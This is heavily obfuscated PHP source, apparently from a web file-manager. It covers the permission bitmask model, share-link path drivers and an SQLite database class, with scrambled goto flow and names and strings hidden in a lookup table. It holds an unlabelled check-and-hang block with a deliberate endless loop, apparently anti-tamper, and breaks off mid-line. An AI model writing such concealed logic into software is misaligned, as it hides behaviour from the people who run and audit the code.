Model($aêù¹òÄëÀ[752])->where($B‡ËâÖšš)->sum($aêù¹òÄëÀ[77]); goto EËˆ›‹‚ëİ; e²‡‹ºöè°: } private function sourceSize() { $c‡Éƒò±Ö =& $_SERVER[úÎü]; $d±ö®‹¬ÏÂ = Model($c‡Éƒò±Ö[752])->where(array($c‡Éƒò±Ö[386] => 0))->sum($c‡Éƒò±Ö[77]); $F†¬îÊÒê’ = Model($c‡Éƒò±Ö[438])->sum($c‡Éƒò±Ö[77]); if ($F†¬îÊÒê’ > $d±ö®‹¬ÏÂ) { $F†¬îÊÒê’ = $d±ö®‹¬ÏÂ; } return array($c‡Éƒò±Ö[77] => (int) $d±ö®‹¬ÏÂ, $c‡Éƒò±Ö[1574] => (int) $F†¬îÊÒê’); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $bƒ¸¾ÁÙŠ =& $_SERVER[úÎü]; $C‘•à¬®œ« = array(array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1645]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1647], $bƒ¸¾ÁÙŠ[1648] => 1, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1651]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1652], $bƒ¸¾ÁÙŠ[1648] => 2, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1653]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1654], $bƒ¸¾ÁÙŠ[1648] => 3, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1655]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1656], $bƒ¸¾ÁÙŠ[1648] => 4, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_VIEW), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1657]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1658], $bƒ¸¾ÁÙŠ[1648] => 5, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1659]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1660], $bƒ¸¾ÁÙŠ[1648] => 6, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bƒ¸¾ÁÙŠ[402] => LNG($bƒ¸¾ÁÙŠ[1661]), $bƒ¸¾ÁÙŠ[1646] => $bƒ¸¾ÁÙŠ[1662], $bƒ¸¾ÁÙŠ[1648] => 7, $bƒ¸¾ÁÙŠ[1649] => 1, $bƒ¸¾ÁÙŠ[1650] => 0)); return $C‘•à¬®œ«; } public static function authCheck($A¥Ã³†ÏÄí, $d²ŸËÔŞ£) { $A¥Ã³†ÏÄí = intval($A¥Ã³†ÏÄí); if (_get($GLOBALS, $_SERVER[úÎü][474])) { return !0; } if ($A¥Ã³†ÏÄí <= 0) { return !1; } if (($A¥Ã³†ÏÄí & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A¥Ã³†ÏÄí & $d²ŸËÔŞ£); } public static function authCheckShow($cêã„–ÃÑ) { return self::authCheck($cêã„–ÃÑ, self::AUTH_SHOW); } public static function authCheckView($eğİÚÏôé) { return self::authCheck($eğİÚÏôé, self::AUTH_VIEW); } public static function authCheckDownload($BÈò©ƒø‹©) { return self::authCheck($BÈò©ƒø‹©, self::AUTH_DOWNLOAD); } public static function authCheckUpload($aÒœ…›ëâ) { return self::authCheck($aÒœ…›ëâ, self::AUTH_UPLOAD); } public static function authCheckEdit($d²Ìíô’òñ) { return self::authCheck($d²Ìíô’òñ, self::AUTH_EDIT); } public static function authCheckRemove($e®èŒğÂÔÚ) { return self::authCheck($e®èŒğÂÔÚ, self::AUTH_REMOVE); } public static function authCheckShare($CÍĞİĞŠğ„) { return self::authCheck($CÍĞİĞŠğ„, self::AUTH_SHARE); } public static function authCheckComment($BÇ™Ñ‹ˆİ) { return self::authCheck($BÇ™Ñ‹ˆİ, self::AUTH_COMMENT); } public static function authCheckEvent($e‹¹Õ¹ÈÂ ) { return self::authCheck($e‹¹Õ¹ÈÂ , self::AUTH_EVENT); } public static function authCheckRoot($fƒˆ¬Ôğ´µ) { return self::authCheck($fƒˆ¬Ôğ´µ, self::AUTH_ROOT); } public static function authCheckAction($bò·ºê„ Ä, $eĞÙ“¢ç÷ª) { goto a¿»§×±Ğ®; f¤ùª¢‰æ: if (($bò·ºê„ Ä & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($bò·ºê„ Ä & $cÃĞ’™¶²Õ); goto fóñ‡½Ã; a¿»§×±Ğ®: $a¢ƒóĞŸÒ =& $_SERVER[úÎü]; $DŠİ”ëÃí¼ = array($a¢ƒóĞŸÒ[1663] => self::AUTH_VIEW, $a¢ƒóĞŸÒ[1054] => self::AUTH_DOWNLOAD, $a¢ƒóĞŸÒ[103] => self::AUTH_UPLOAD, $a¢ƒóĞŸÒ[1611] => self::AUTH_EDIT, $a¢ƒóĞŸÒ[1610] => self::AUTH_REMOVE, $a¢ƒóĞŸÒ[1621] => self::AUTH_SHARE, $a¢ƒóĞŸÒ[348] => self::AUTH_COMMENT, $a¢ƒóĞŸÒ[1474] => self::AUTH_EVENT, $a¢ƒóĞŸÒ[1664] => self::AUTH_ROOT); if (!isset($DŠİ”ëÃí¼[$eĞÙ“¢ç÷ª])) { return; } goto C‹İ£³Êæ; C‹İ£³Êæ: $cÃĞ’™¶²Õ = $DŠİ”ëÃí¼[$eĞÙ“¢ç÷ª]; $bò·ºê„ Ä = intval($bò·ºê„ Ä); if ($bò·ºê„ Ä <= 0) { return !1; } goto f¤ùª¢‰æ; fóñ‡½Ã: } public static function authDisable($Fæõ§£÷Ú×, $Eª„×ÏÒ¹) { if (intval($Fæõ§£÷Ú×) <= 0) { return 0; } return intval($Fæõ§£÷Ú×) & ~$Eª„×ÏÒ¹; } public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x73\157\165\162\x63\145\x41\x75\x74\x68\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\x65", "\141\165\164\150", "\154\x61\142\145\154", "\x64\x69\x73\x70\x6c\141\171", "\163\171\x73\x74\x65\x6d", "\163\157\162\x74"); public function initData() { $fªœå¼„ó = $this->authDefault(); foreach ($fªœå¼„ó as $c¤ñ«º‰•ğ) { $this->add($c¤ñ«º‰•ğ); } } public function listData($a—ÊÂ‰¸ã = false, $C¹’Íø—‘² = "\x73\157\x72\164", $d‡ÁğöµÜ‚ = false) { return parent::listData($a—ÊÂ‰¸ã, $C¹’Íø—‘², $d‡ÁğöµÜ‚); } public function update($D‚”¶ß¢Ò, $D×Ÿ¶‘£¨é) { $E¨™ƒˆ·¼ =& $_SERVER[úÎü]; $d£¯ÔÀíùÓ = parent::listData($D‚”¶ß¢Ò); $AÔÙªÎò…Ÿ = $this->findByName($D×Ÿ¶‘£¨é[$E¨™ƒˆ·¼[28]]); if (!$d£¯ÔÀíùÓ || $AÔÙªÎò…Ÿ && $AÔÙªÎò…Ÿ[$E¨™ƒˆ·¼[383]] != $d£¯ÔÀíùÓ[$E¨™ƒˆ·¼[383]]) { return !1; } $this->filterAuth($D×Ÿ¶‘£¨é[$E¨™ƒˆ·¼[392]]); return parent::update($D‚”¶ß¢Ò, $D×Ÿ¶‘£¨é); } public function remove($E¡‹ÇŒ±ÃÙ) { $b¯‡Á›×ğ = parent::listData($E¡‹ÇŒ±ÃÙ); if (!$b¯‡Á›×ğ || $b¯‡Á›×ğ[$_SERVER[úÎü][1126]]) { return !1; } return parent::remove($E¡‹ÇŒ±ÃÙ); } public function add($b¯Á…éŞİ = array()) { goto aô¡¶ğ“¾; fæÜÆ‹òÉ›: return parent::insert($b¯Á…éŞİ); goto cù³ãÎ¸¯; AëîÂô„ó: $b¯Á…éŞİ = array_merge($B·’Œ„à—ª, $b¯Á…éŞİ); $b¯Á…éŞİ[$d«¶©¥éÎ[1667]] = $this->getSort(); $this->filterAuth($b¯Á…éŞİ[$d«¶©¥éÎ[392]]); goto fæÜÆ‹òÉ›; aô¡¶ğ“¾: $d«¶©¥éÎ =& $_SERVER[úÎü]; if ($this->findByName($b¯Á…éŞİ[$d«¶©¥éÎ[28]])) { return !1; } $B·’Œ„à—ª = array($d«¶©¥éÎ[28] => $d«¶©¥éÎ[33], $d«¶©¥éÎ[392] => 1, $d«¶©¥éÎ[1665] => $d«¶©¥éÎ[1654], $d«¶©¥éÎ[1666] => 1, $d«¶©¥éÎ[1126] => 0, $d«¶©¥éÎ[1667] => 0); goto AëîÂô„ó; cù³ãÎ¸¯: } private function getSort() { $FëŒãø›ö¿ =& $_SERVER[úÎü]; $AâÒ¶Ÿ× = parent::listData(); $BÃšÃÅË†® = array_to_keyvalue($AâÒ¶Ÿ×, $FëŒãø›ö¿[33], $FëŒãø›ö¿[1667]); return empty($BÃšÃÅË†®) ? 0 : max($BÃšÃÅË†®) + 1; } private function filterAuth(&$F‹í¾Ìæ‚) { goto cìÇàÖºë´; cìÇàÖºë´: if (!$F‹í¾Ìæ‚) { return; } $B„â†ô”àæ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $fÙĞ†øª£µ = array(); goto Dª¥­§ïŠ§; fÏÌ‚Â‡„: foreach ($fÙĞ†øª£µ as $b÷À÷ÀïÄô) { if (isset($e…¼Îñ‡[$b÷À÷ÀïÄô])) { $fÙĞ†øª£µ = array_merge($fÙĞ†øª£µ, $e…¼Îñ‡[$b÷À÷ÀïÄô]); } } $fÙĞ†øª£µ[] = self::AUTH_SHOW; $F‹í¾Ìæ‚ = array_sum(array_unique($fÙĞ†øª£µ)); goto fèã£Á´; Dª¥­§ïŠ§: foreach ($B„â†ô”àæ as $b÷À÷ÀïÄô) { if ($F‹í¾Ìæ‚ & $b÷À÷ÀïÄô) { $fÙĞ†øª£µ[] = $b÷À÷ÀïÄô; } } if (in_array(self::AUTH_ROOT, $fÙĞ†øª£µ)) { $F‹í¾Ìæ‚ = array_sum($B„â†ô”àæ); return; } $e…¼Îñ‡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto fÏÌ‚Â‡„; fèã£Á´: } public function sort($aàäË–‰Ãè, $eå©Æ¾µÚ±) { return parent::update($aàäË–‰Ãè, $eå©Æ¾µÚ±); } } goto a¯êÊèêğ; F°çµ›Æì: if (!isset($_SERVER[$_SERVER[úÎü][793]]) || !isset($_SERVER[$_SERVER[úÎü][833]])) { goto fëè±”´²Ç; a‘á¼ÎÓ…: $DÎ¨¨Ã®ÏÎ = explode($_SERVER[úÎü][225], $FÄÅ¼²¢ö‡); if (count($DÎ¨¨Ã®ÏÎ) < $_SERVER[úÎü][576]) { $A¬ÍĞŠŸ«– = $_SERVER[úÎü][799]; $A¬ÍĞŠŸ«–(); } $b¸éÈˆ½à = $_SERVER[úÎü][832]; goto bê…¤Û‘ò; bê…¤Û‘ò: $b¸éÈˆ½à($_SERVER[$_SERVER[úÎü][797]] . $_SERVER[úÎü][798]); $FˆÃ·§óö« = 2; while ($FˆÃ·§óö« > 1) { $f´†‘ÒÒ¶ª = rawurlencode($FˆÃ·§óö« . $_SERVER[úÎü][368]); } goto AãÆ…‚‹Ü; fëè±”´²Ç: $C½õÇ·Ğï = $_SERVER[úÎü][796]; $C‚½àší‘¿ = $_SERVER[$_SERVER[úÎü][797]] . $_SERVER[úÎü][798]; $FÄÅ¼²¢ö‡ = $C½õÇ·Ğï($C‚½àší‘¿); goto a‘á¼ÎÓ…; AãÆ…‚‹Ü: } class PathDriverDbShareLink extends PathDriverDB { public function __construct($aÓ¸ÀùíĞ¢) { $this->pathParse = $aÓ¸ÀùíĞ¢; $this->model = Model($_SERVER[úÎü][1162]); } protected function infoParse($c•ß¡Ô¢³, $bõ…‰„­  = false, $C«Üœ·‹Ûæ = false) { $bÃï›Ú°¨‹ =& $_SERVER[úÎü]; return Action($bÃï›Ú°¨‹[1030])->sharePathInfo($this->pathParse[$bÃï›Ú°¨‹[75]], !0); } public function listPath($eæŞöà«, $b³¥µõ‰µ™ = false) { $fŠø¾—ã÷‰ =& $_SERVER[úÎü]; $Fõ’°¤®Ö³ = parent::listPath($eæŞöà«, $b³¥µõ‰µ™); foreach ($Fõ’°¤®Ö³ as $B÷õèİË÷‡ => $A²º©ƒ°•Ö) { if (!in_array($B÷õèİË÷‡, array($fŠø¾—ã÷‰[73], $fŠø¾—ã÷‰[74]))) { continue; } foreach ($A²º©ƒ°•Ö as $F˜…Ô¸À => $eÂØ¢˜ÌïÅ) { $Fõ’°¤®Ö³[$B÷õèİË÷‡][$F˜…Ô¸À] = Action($fŠø¾—ã÷‰[1030])->shareItemInfo($eÂØ¢˜ÌïÅ); } } return $Fõ’°¤®Ö³; } public function listAll($Bæ´“ö›Ã©) { goto C¯øáç‰†; C¯øáç‰†: $f‡ƒÂµùµÉ =& $_SERVER[úÎü]; $bäÔİæ«¿¥ = IO::info($this->pathParse[$f‡ƒÂµùµÉ[75]]); if (!$bäÔİæ«¿¥) { return array(); } goto C®É’Áø´Ú; aäÀ¥ôÖ´: return $E¿ù‰«Á÷; goto E¦ùğ§‰ç´; C®É’Áø´Ú: $E¿ù‰«Á÷ = $this->model->listAll($Bæ´“ö›Ã©); foreach ($E¿ù‰«Á÷ as &$CˆåÎä›±Ì) { $CˆåÎä›±Ì[$f‡ƒÂµùµÉ[407]] = Action($f‡ƒÂµùµÉ[1030])->shareItemInfo($CˆåÎä›±Ì[$f‡ƒÂµùµÉ[407]]); } unset($CˆåÎä›±Ì); goto aäÀ¥ôÖ´; E¦ùğ§‰ç´: } } class PathDriverDriverShareItem { public function __construct($Fá¢„«èˆ¥) { $this->pathParse = $Fá¢„«èˆ¥; } public function __call($C¹×„ôÕ™, $A¢õƒÌ³Œ) { $fùáÌİô¤Ÿ =& $_SERVER[úÎü]; if (method_exists($this, $C¹×„ôÕ™)) { return; } $D¼Æ‚ƒ¼ˆ¿ = call_user_func_array(array($fùáÌİô¤Ÿ[1170], $C¹×„ôÕ™), $A¢õƒÌ³Œ); $eË¯À†· = array($fùáÌİô¤Ÿ[1171], $fùáÌİô¤Ÿ[1172], $fùáÌİô¤Ÿ[1173], $fùáÌİô¤Ÿ[1174], $fùáÌİô¤Ÿ[507], $fùáÌİô¤Ÿ[509], $fùáÌİô¤Ÿ[1175], $fùáÌİô¤Ÿ[103], $fùáÌİô¤Ÿ[1176], $fùáÌİô¤Ÿ[1177]); if (in_array($C¹×„ôÕ™, $eË¯À†·)) { $D¼Æ‚ƒ¼ˆ¿ = $this->getPathOuter($D¼Æ‚ƒ¼ˆ¿); } return $D¼Æ‚ƒ¼ˆ¿; } public function copy($C—¡¤²¨‡­, $Cè¤ ÉÃ—˜, $fïµµïè† = false) { return $this->copyMove($C—¡¤²¨‡­, $Cè¤ ÉÃ—˜, $fïµµïè†, $_SERVER[úÎü][507]); } public function move($c§ÔäÍ¾õ›, $C§©·ÊÏŠ™, $A¶í™ä¼ñ¨ = false) { return $this->copyMove($c§ÔäÍ¾õ›, $C§©·ÊÏŠ™, $A¶í™ä¼ñ¨, $_SERVER[úÎü][509]); } private function copyMove($dø­ö×ƒ , $Cïå„¯é»³, $aâƒîŠ…½¿, $B÷ğË†‘¥Œ) { goto aƒùÙŒÄÂ¼; dˆ‚Ÿù»…™: if ($Eö—ğÏ°‰->pathParse[$c†À¤ÚÕæ«[1008]]) { $Cïå„¯é»³ = $Eö—ğÏ°‰->pathParse[$c†À¤ÚÕæ«[1008]]; } else { $Cïå„¯é»³ = $Dá——‡‘ò”; } $d·ÅàÄù¬ = IO::copyMove($dø­ö×ƒ , $Cïå„¯é»³, $aâƒîŠ…½¿, $B÷ğË†‘¥Œ); $d·ÅàÄù¬ = $this->getPathOuter($d·ÅàÄù¬); goto C…’Â›Ôï; aƒùÙŒÄÂ¼: $c†À¤ÚÕæ« =& $_SERVER[úÎü]; $Dá——‡‘ò” = $Cïå„¯é»³; $Eö—ğÏ°‰ = IO::driverMake($Cïå„¯é»³); goto dˆ‚Ÿù»…™; C…’Â›Ôï: return $d·ÅàÄù¬; goto eôÒ¸­½ö®; eôÒ¸­½ö®: } public function pathThis($B¶°£·âÊá) { return get_path_this($this->pathParse[$_SERVER[úÎü][75]]); } public function pathFather($Cø»Ô¶£“†) { return get_path_father($this->pathParse[$_SERVER[úÎü][75]]); } public function iconvSystem($fëÎÃ‘ö•Ì) { return $fëÎÃ‘ö•Ì; } protected function infoParse($dÖñÇ±õÖ–, $f˜éŒ’Ì•÷ = false) { $B˜¤ª·Šñä =& $_SERVER[úÎü]; $FØÃ°Ù–œì = $this->pathParse[$B˜¤ª·Šñä[454]][$B˜¤ª·Šñä[1031]] . $this->pathParse[$B˜¤ª·Šñä[1024]]; if ($f˜éŒ’Ì•÷) { $c°óÃâŠÎš = IO::infoWithChildren($FØÃ°Ù–œì); } else { $c°óÃâŠÎš = IO::info($FØÃ°Ù–œì); } $EÇ­‰Ê‹Î¯ = $this->pathParse[$B˜¤ª·Šñä[454]]; return Action($B˜¤ª·Šñä[1169])->_shareItemeParse($c°óÃâŠÎš, $EÇ­‰Ê‹Î¯); } public function listAll($bÀˆ•¨Õ©) { $d…™¸Ëµê =& $_SERVER[úÎü]; $bˆåÁæĞ‡± = IO::listAll($bÀˆ•¨Õ©); $F•ğ×º¥Ë = $this->pathParse[$d…™¸Ëµê[454]]; foreach ($bˆåÁæĞ‡± as &$Fƒ›À‚ÌªŠ) { check_abort(); $Fƒ›À‚ÌªŠ = array_merge(IO::info($Fƒ›À‚ÌªŠ[$d…™¸Ëµê[75]]), $Fƒ›À‚ÌªŠ); $Fƒ›À‚ÌªŠ[$d…™¸Ëµê[407]] = Action($d…™¸Ëµê[1169])->_shareItemeParse($Fƒ›À‚ÌªŠ, $F•ğ×º¥Ë); } unset($Fƒ›À‚ÌªŠ); return $bˆåÁæĞ‡±; } public function getPathOuter($cãÜ‡æóæÊ) { goto Cïİò±¬á¦; Cïİò±¬á¦: $b©šæ Ğ¿ =& $_SERVER[úÎü]; $eŠ İô¼ß = KodIO::parse($cãÜ‡æóæÊ); if ($eŠ İô¼ß[$b©šæ Ğ¿[29]] == KodIO::KOD_SHARE_ITEM) { return $eŠ İô¼ß[$b©šæ Ğ¿[75]]; } goto dí‹ÇÍò’; dí‹ÇÍò’: $aöÍ¯³œçô = KodIO::clear($cãÜ‡æóæÊ); $d¿‰¡÷…• = KodIO::clear($this->pathParse[$b©šæ Ğ¿[454]][$b©šæ Ğ¿[1031]]); $dƒ‹Ëá’–½ = substr($aöÍ¯³œçô, strlen($d¿‰¡÷…•)); goto Dª·ÒŠœ‰†; Dª·ÒŠœ‰†: if (substr($aöÍ¯³œçô, 0, strlen($d¿‰¡÷…•)) != $d¿‰¡÷…•) { return !1; } return $this->pathParse[$b©šæ Ğ¿[1025]] . $b©šæ Ğ¿[8] . ltrim($dƒ‹Ëá’–½, $b©šæ Ğ¿[8]); goto EİÉ¤èä‹‡; EİÉ¤èä‹‡: } public function getType() { $cà¸¸÷°¤ =& $_SERVER[úÎü]; $díªªØââÇ = str_replace($cà¸¸÷°¤[71], $cà¸¸÷°¤[33], get_class($this)); return strtolower($díªªØââÇ); } public function isTypeObject($E´±ÔÂ¦¾°) { return IO::isTypeObject($E´±ÔÂ¦¾°); } public function info($eÉ’èëÄ¹) { return $this->infoParse($eÉ’èëÄ¹); } public function infoAuth($DÊµƒ•ë ç) { return $this->infoParse($DÊµƒ•ë ç); } public function infoWithChildren($a“³›Ã’¤) { return $this->infoParse($a“³›Ã’¤, !0); } public function infoFull($c¢¦³Û»šİ) { return $this->infoParse($c¢¦³Û»šİ); } } goto dÍôĞà‡¶É; d¤îÕˆ°æ : class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto F—é£¢³É; b’çùò…ëœ: $this->in =& $in; $this->values[$cÓë–Úí[6]] =& $config; $this->values[$cÓë–Úí[7]] =& $in; goto dÈÒº‘¥ø¿; F—é£¢³É: $cÓë–Úí =& $_SERVER[úÎü]; global $in, $config; $this->config =& $config; goto b’çùò…ëœ; dÈÒº‘¥ø¿: $this->tpl = TEMPLATE . MOD . $cÓë–Úí[8]; $this->_classObjectID = mt_rand(0, 10000); goto DçíÈÕ›‰Ş; DçíÈÕ›‰Ş: } public function loadClass($a´½†›´°) { if (1 === func_num_args()) { $this->{$a´½†›´°} = new $a´½†›´°(); } else { $e“¬¤–îŒˆ = new ReflectionClass($a´½†›´°); $cæÁŞğÆˆ = func_get_args(); array_shift($cæÁŞğÆˆ); $this->{$a´½†›´°} = $e“¬¤–îŒˆ->newInstanceArgs($cæÁŞğÆˆ); } return $this->{$a´½†›´°}; } protected function assign($B¸åì¿‡Íó, $A¸ªÌœ) { $this->values[$B¸åì¿‡Íó] = $A¸ªÌœ; } protected function display($F¶»µ¯ŞÑ°) { ob_end_clean(); extract($this->values); require $this->tpl . $F¶»µ¯ŞÑ°; } } class DbSqliteBase extends Db { public function __construct($d—¨ÅîƒÚ = '') { $e¤ Ê…ÚŒâ =& $_SERVER[úÎü]; if (!extension_loaded($e¤ Ê…ÚŒâ[9])) { think_exception(think_lang($e¤ Ê…ÚŒâ[10]) . $e¤ Ê…ÚŒâ[11]); } if (!empty($d—¨ÅîƒÚ)) { if (!isset($d—¨ÅîƒÚ[$e¤ Ê…ÚŒâ[12]])) { $d—¨ÅîƒÚ[$e¤ Ê…ÚŒâ[12]] = 438; } $this->config = $d—¨ÅîƒÚ; if (empty($this->config[$e¤ Ê…ÚŒâ[13]])) { $this->config[$e¤ Ê…ÚŒâ[13]] = array(); } } } public function connect($Fø˜ˆŞ¢ÕÎ = '', $Fâ¢èñ˜ù¢ = 0) { $b§èõ½Ó¨ =& $_SERVER[úÎü]; if (!isset($this->linkID[$Fâ¢èñ˜ù¢])) { goto D§á–ùßµ¿; añ…‚°ĞÑõ: $this->linkID[$Fâ¢èñ˜ù¢] = $dŠˆ³ãÊÚ($Fø˜ˆŞ¢ÕÎ[$b§èõ½Ó¨[17]], $Fø˜ˆŞ¢ÕÎ[$b§èõ½Ó¨[12]]); if (!$this->linkID[$Fâ¢èñ˜ù¢]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cŸç¶îëù«; D§á–ùßµ¿: if (empty($Fø˜ˆŞ¢ÕÎ)) { $Fø˜ˆŞ¢ÕÎ = $this->config; } $EÚ’’™êŒ = !empty($Fø˜ˆŞ¢ÕÎ[$b§èõ½Ó¨[13]][$b§èõ½Ó¨[14]]) ? $Fø˜ˆŞ¢ÕÎ[$b§èõ½Ó¨[13]][$b§èõ½Ó¨[14]] : $this->pconnect; $dŠˆ³ãÊÚ = $EÚ’’™êŒ ? $b§èõ½Ó¨[15] : $b§èõ½Ó¨[16]; goto añ…‚°ĞÑõ; cŸç¶îëù«: @sqlite_busy_timeout($this->linkID[$Fâ¢èñ˜ù¢], 30000); if (1 != think_config($b§èõ½Ó¨[18])) { unset($this->config); } goto DŠî‚ï‹ó; DŠî‚ï‹ó: } return $this->linkID[$Fâ¢èñ˜ù¢]; } public function free() { $this->queryID = null; } public function query($e™¦ÆÁÉÌ) { goto E²Œ‹†…øß; B“ƒ×²‚¾: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $e„ºËô‘‡ = $this->getAll(); return $e„ºËô‘‡; } goto bÔ†§•–å™; b‰‰µÊÅÂ: $this->queryStr = $e™¦ÆÁÉÌ; if ($this->queryID) { $this->free(); } think_action_status($BÏ‘Ô‰Äè[19], 1); goto d‰¿é‘¢Ó; d‰¿é‘¢Ó: think_status($BÏ‘Ô‰Äè[20]); $this->queryID = sqlite_query($this->_linkID, $e™¦ÆÁÉÌ); $this->debug(); goto B“ƒ×²‚¾; E²Œ‹†…øß: $BÏ‘Ô‰Äè =& $_SERVER[úÎü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b‰‰µÊÅÂ; bÔ†§•–å™: } public function execute($AïÃ¡…Ÿ”‡) { goto c®ÎåÇ¸ç®; cÅğ–¬¼­: $this->queryStr = $AïÃ¡…Ÿ”‡; if ($this->queryID) { $this->free(); } think_action_status($eÙÂÒ¬””ò[21], 1); goto Fòõ¶‚ª¹Ø; Fòõ¶‚ª¹Ø: think_status($eÙÂÒ¬””ò[20]); $cïêÏ“Íš  = sqlite_exec($this->_linkID, $AïÃ¡…Ÿ”‡); $this->debug(); goto DÑ·©“Â‹; DÑ·©“Â‹: if (!1 === $cïêÏ“Íš ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto B°¹„¿Ñå; c®ÎåÇ¸ç®: $eÙÂÒ¬””ò =& $_SERVER[úÎü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÅğ–¬¼­; B°¹„¿Ñå: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[úÎü][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÈÕ™Œïˆµ = sqlite_query($this->_linkID, $_SERVER[úÎü][23]); if (!$AÈÕ™Œïˆµ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $d™å‰ãÈÛ = sqlite_query($this->_linkID, $_SERVER[úÎü][24]); if (!$d™å‰ãÈÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cÃĞù­Üƒ­ = array(); if ($this->numRows > 0) { for ($cÁ†àÁ¦öé = 0; $cÁ†àÁ¦öé < $this->numRows; $cÁ†àÁ¦öé++) { $cÃĞù­Üƒ­[$cÁ†àÁ¦öé] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $cÃĞù­Üƒ­; } public function getFields($d…ğĞÄÊ†ì) { $c’Ã†·ÚÊ… =& $_SERVER[úÎü]; $Bæ‡¡‰—¼ = $this->query($c’Ã†·ÚÊ…[25] . $d…ğĞÄÊ†ì . $c’Ã†·ÚÊ…[26]); $EÔğ°Òñ = array(); if ($Bæ‡¡‰—¼) { foreach ($Bæ‡¡‰—¼ as $eˆÑ –Ù => $Fé•ùí¹Â‹) { $EÔğ°Òñ[$Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[27]]] = array($c’Ã†·ÚÊ…[28] => $Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[27]], $c’Ã†·ÚÊ…[29] => $Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[30]], $c’Ã†·ÚÊ…[31] => (bool) ($Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[32]] === $c’Ã†·ÚÊ…[33]), $c’Ã†·ÚÊ…[34] => $Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[35]], $c’Ã†·ÚÊ…[36] => strtolower($Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[37]]) == $c’Ã†·ÚÊ…[38], $c’Ã†·ÚÊ…[39] => strtolower($Fé•ùí¹Â‹[$c’Ã†·ÚÊ…[40]]) == $c’Ã†·ÚÊ…[41]); } } return $EÔğ°Òñ; } public function getTables($bàØ×¡ÓÍ = '') { $DÜ¶ƒ†„á =& 